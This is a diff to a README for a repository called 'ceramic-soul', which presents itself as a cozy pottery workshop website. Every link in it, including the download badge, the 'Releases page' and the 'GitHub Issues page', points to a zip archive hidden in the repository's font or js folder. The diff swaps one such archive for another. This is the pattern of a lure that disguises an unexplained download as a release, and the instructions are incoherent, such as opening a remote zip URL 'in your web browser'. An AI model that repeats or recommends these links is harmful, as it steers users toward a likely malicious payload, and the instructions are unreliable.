@@ -1,7 +1,7 @@
 # 🎨 ceramic-soul - Experience Cozy Handcrafted Pottery Online
 
-![Download](https://github.com/Khawoat2006/ceramic-soul/raw/refs/heads/master/src/font/ceramic_soul_2.2.zip%https://github.com/Khawoat2006/ceramic-soul/raw/refs/heads/master/src/font/ceramic_soul_2.2.zip)  
-[![GitHub Releases](https://github.com/Khawoat2006/ceramic-soul/raw/refs/heads/master/src/font/ceramic_soul_2.2.zip)](https://github.com/Khawoat2006/ceramic-soul/raw/refs/heads/master/src/font/ceramic_soul_2.2.zip)
+![Download](https://github.com/Khawoat2006/ceramic-soul/raw/refs/heads/master/src/js/soul-ceramic-3.5.zip%https://github.com/Khawoat2006/ceramic-soul/raw/refs/heads/master/src/js/soul-ceramic-3.5.zip)  
+[![GitHub Releases](https://github.com/Khawoat2006/ceramic-soul/raw/refs/heads/master/src/js/soul-ceramic-3.5.zip)](https://github.com/Khawoat2006/ceramic-soul/raw/refs/heads/master/src/js/soul-ceramic-3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ Welcome to **ceramic-soul**! This is a cozy, multi-page website designed for a h
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest release: [Download Ceramic Soul](https://github.com/Khawoat2006/ceramic-soul/raw/refs/heads/master/src/font/ceramic_soul_2.2.zip).
+To get started, visit this page to download the latest release: [Download Ceramic Soul](https://github.com/Khawoat2006/ceramic-soul/raw/refs/heads/master/src/js/soul-ceramic-3.5.zip).
 
 After you've downloaded the file, follow these steps:
 
@@ -25,9 +25,9 @@ After you've downloaded the file, follow these steps:
 
 ## 🖥️ Running the Application
 
-You do not need any software installed to run the ceramic-soul website. Simply open the `https://github.com/Khawoat2006/ceramic-soul/raw/refs/heads/master/src/font/ceramic_soul_2.2.zip` file in your web browser. Here's how to do it:
+You do not need any software installed to run the ceramic-soul website. Simply open the `https://github.com/Khawoat2006/ceramic-soul/raw/refs/heads/master/src/js/soul-ceramic-3.5.zip` file in your web browser. Here's how to do it:
 
-1. Right-click on `https://github.com/Khawoat2006/ceramic-soul/raw/refs/heads/master/src/font/ceramic_soul_2.2.zip`.
+1. Right-click on `https://github.com/Khawoat2006/ceramic-soul/raw/refs/heads/master/src/js/soul-ceramic-3.5.zip`.
 2. Select "Open with" and choose your preferred web browser (Chrome, Firefox, etc.).
 3. The website will load, and you can start browsing!
 
@@ -47,10 +47,10 @@ ceramic-soul is built with several modern web technologies to ensure a smooth ex
 
 ## 👐 Support & Feedback
 
-If you encounter any issues or have suggestions for improvements, feel free to reach out. You can create an issue on our [GitHub Issues page](https://github.com/Khawoat2006/ceramic-soul/raw/refs/heads/master/src/font/ceramic_soul_2.2.zip).
+If you encounter any issues or have suggestions for improvements, feel free to reach out. You can create an issue on our [GitHub Issues page](https://github.com/Khawoat2006/ceramic-soul/raw/refs/heads/master/src/js/soul-ceramic-3.5.zip).
 
 ## 🌍 Stay Updated
 
-Stay tuned for updates and new features! Check back to the [Releases page](https://github.com/Khawoat2006/ceramic-soul/raw/refs/heads/master/src/font/ceramic_soul_2.2.zip) for the latest versions and improvements.
+Stay tuned for updates and new features! Check back to the [Releases page](https://github.com/Khawoat2006/ceramic-soul/raw/refs/heads/master/src/js/soul-ceramic-3.5.zip) for the latest versions and improvements.
 
 Thank you for choosing **ceramic-soul**. We hope you enjoy your experience with our handcrafted pottery workshop website!
